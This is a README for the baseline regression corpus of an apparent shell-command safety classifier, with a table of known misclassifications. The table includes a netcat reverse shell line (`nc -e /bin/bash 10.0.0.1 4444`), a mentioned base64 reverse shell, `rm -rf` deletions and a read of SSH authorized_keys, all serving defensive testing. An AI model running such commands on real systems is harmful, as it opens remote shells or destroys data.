# Baseline & regression safety net (Stage 0)

This directory is the safety net for the hardening work. It captures how the
project behaves **before** any changes, so every later stage can be proven to be
an improvement and nothing silently regresses.

## Contents

| File | Purpose |
| --- | --- |
| `ENVIRONMENT.txt` | OS, Python, and git commit the baseline was captured at. |
| `unittest_baseline.txt` | Output of the original test suite (37 tests) before the harness was added. |
| `benchmark_baseline.json` | Original `cybershell bench-eval --json` output (28 cases). |
| `baseline_corpus.jsonl` | Curated commands tagged `lock_block`, `lock_allow`, or `known_issue`. |
| `behavior_snapshot.json` | Frozen decision/level/score/rules for every corpus command. |

The snapshot tool lives at `../tools/baseline_snapshot.py`; the invariant test at
`../tests/test_baseline_regression.py`.

## The three corpus categories

- **`lock_block`** — must `block` now and after every future stage. Hard invariant.
- **`lock_allow`** — must `allow` now and after every future stage. Hard invariant.
- **`known_issue`** — current behavior is wrong on purpose. Each entry records its
  `current_decision`, the `target_decision` it should become, and the `target_stage`
  that fixes it. These document the bugs so they cannot be fixed silently or forgotten.

## How it is used in each stage

```bash
# See whether anything moved since the last snapshot:
PYTHONPATH=src python tools/baseline_snapshot.py --check

# Run the full suite, including the invariant tests:
PYTHONPATH=src python -m unittest discover -s tests

# After intentionally changing behavior (e.g. fixing a known_issue) and reviewing
# the diff, re-baseline so the snapshot reflects the new, correct behavior:
PYTHONPATH=src python tools/baseline_snapshot.py --generate
```

`--check` fails (exit 1) only if a `lock_block`/`lock_allow` invariant drifts — a real
regression. Changes to `known_issue` entries are reported as **expected progress**, not
failures.

## Known-issue lifecycle

When a stage fixes a `known_issue`:

1. Confirm the new behavior matches its `target_decision`.
2. Promote the entry to `lock_block` or `lock_allow` and update its `note`.
3. Re-run `--generate` to refresh the snapshot.

From that point the corrected behavior is itself a locked invariant, so a later stage
cannot reintroduce the bug.

## Known issues pinned at Stage 0

| id | command | now | target | stage |
| --- | --- | --- | --- | --- |
| ki01 | `rm -rf node_modules` | block | allow | 1 |
| ki02 | `rm -rf ./build` | block | allow | 1 |
| ki03 | `rm -rf /tmp/mycache` | block | caution | 1 |
| ki04 | `ls -la ~/.ssh/authorized_keys` | warn | allow | 1 |
| ki05 | `cat notes.environment` | warn | allow | 1 |
| ki06 | `stat deploy.env.example` | warn | allow | 1 |
| ki07 | base64-encoded reverse shell | allow | block | 2 |
| ki08 | `nc -e /bin/bash 10.0.0.1 4444` | allow | block | 1 |

ki03, ki07, and ki08 were surfaced *during* Stage 0 baselining.
